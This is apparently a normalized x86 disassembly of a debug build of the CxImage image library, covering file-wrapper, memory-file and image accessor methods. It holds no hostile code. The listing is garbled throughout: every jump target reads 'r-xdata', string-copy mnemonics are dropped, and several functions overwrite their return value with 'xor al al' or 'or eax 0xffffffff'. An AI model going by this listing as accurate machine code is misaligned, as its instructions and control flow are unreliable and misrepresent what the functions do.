mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ fseek@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
neg eax
sbb eax eax
inc eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?Tell@CxIOFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ ftell@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Size@CxIOFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ ftell@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
mov esi esp
push 0x2
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ fseek@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
mov esi esp
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
call [ ftell@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov [ ebp - 0xc ] eax
mov esi esp
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
call [ fseek@IAT ]
add esp 0xc
cmp esi esp
call _chkesp
mov eax [ ebp - 0xc ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Flush@CxIOFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ fflush@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
neg eax
sbb eax eax
inc eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Eof@CxIOFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0xc ]
and eax 0x10
neg eax
sbb eax eax
neg eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Error@CxIOFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0xc ]
and eax 0x20
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?PutC@CxIOFile@@UAE_NE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call [ fputc@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
mov ecx [ ebp + 0x8 ]
and ecx 0xff
xor edx edx
cmp eax ecx
sete dl
mov al dl
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?GetC@CxIOFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ getc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
??0CxIOFile@@QAE@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??0CxFile@@QAE@ABV0@@Z
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x8 ]
mov [ ecx + 0x8 ] al
mov ecx [ ebp - 0x4 ]
mov [ ecx ] CxIOFile::`vbtable'
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??4CxIOFile@@QAEAAV0@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??4CxFile@@QAEAAV0@ABV0@@Z
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x8 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??_FCxIOFile@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
sub_40d690
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call ??1CxIOFile@@UAE@XZ
mov eax [ ebp + 0x8 ]
and eax 0x1
test eax eax
je r-xdata
push ??1CxIOFile@@UAE@XZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
push edx
push 0xc
mov eax [ ebp - 0x4 ]
push eax
call sub_419250
mov ecx [ ebp + 0x8 ]
and ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x4 ]
sub eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x4
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??0CxMemFile@@QAE@PAEK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ??0CxFile@@QAE@XZ
mov eax [ ebp - 0x4 ]
mov [ eax ] CxMemFile::`vbtable'
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
xor edx edx
cmp [ ebp + 0x8 ] 0x0
sete dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] dl
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
??1CxMemFile@@UAE@XZ
push ebp
mov ebp esp
push 0xffffffff
push sub_434bd9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov [ eax ] CxMemFile::`vbtable'
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
call ?Close@CxMemFile@@UAE_NXZ
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call ??1CxFile@@UAE@XZ
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Close@CxMemFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0xc ]
test edx edx
je r-xdata
mov esi esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
?Open@CxMemFile@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov esi esp
push 0x0
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x4 ] 0x0
setne cl
mov al cl
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?GetBuffer@CxMemFile@@QAEPAE_N@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0xff
neg eax
sbb eax eax
inc eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] al
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
??0CxMemFile@@QAE@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??0CxFile@@QAE@ABV0@@Z
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0xc ]
mov [ ecx + 0xc ] al
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] CxMemFile::`vbtable'
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??4CxMemFile@@QAEAAV0@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ??4CxFile@@QAEAAV0@ABV0@@Z
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0xc ]
mov [ ecx + 0xc ] al
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??_FCxMemFile@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call ??0CxMemFile@@QAE@PAEK@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
sub_40dad0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call ??1CxMemFile@@UAE@XZ
mov eax [ ebp + 0x8 ]
and eax 0x1
test eax eax
je r-xdata
push ??1CxMemFile@@UAE@XZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
push edx
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call sub_419250
mov ecx [ ebp + 0x8 ]
and ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x4 ]
sub eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x4
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??4tagCxTextInfo@@QAEAAU0@ABU0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov edi [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov ecx 0x415
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
??1CxImage@@UAE@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImage::`vbtable'
mov ecx [ ebp - 0x4 ]
call ?Destroy@CxImage@@QAE_NXZ
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?GetDIB@CxImage@@QBEPAXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetWidth@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetEffWidth@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetNumColors@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetBpp@CxImage@@QBEGXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x16 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetType@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetLastError@CxImage@@QAEPADXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetFrameDelay@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetFrameDelay@CxImage@@QAEXK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x160 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetOffset@CxImage@@QAEXPAJ0@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x180 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x184 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
?SetOffset@CxImage@@QAEXJJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x180 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x184 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
?GetJpegQuality@CxImage@@QBEEXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x154 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetJpegQuality@CxImage@@QAEXE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x8 ]
mov [ eax + 0x154 ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetJpegScale@CxImage@@QBEEXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x155 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetJpegScale@CxImage@@QAEXE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov cl [ ebp + 0x8 ]
mov [ eax + 0x155 ] cl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetXDPI@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x164 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetYDPI@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetClrImportant@CxImage@@QBEKXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetProgress@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x144 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?GetEscape@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x148 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetProgress@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x144 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?SetEscape@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x148 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?GetTransIndex@CxImage@@QBEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?SetTransIndex@CxImage@@QAEXJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14c ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
?SetTransColor@CxImage@@QAEXUtagRGBQUAD@@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
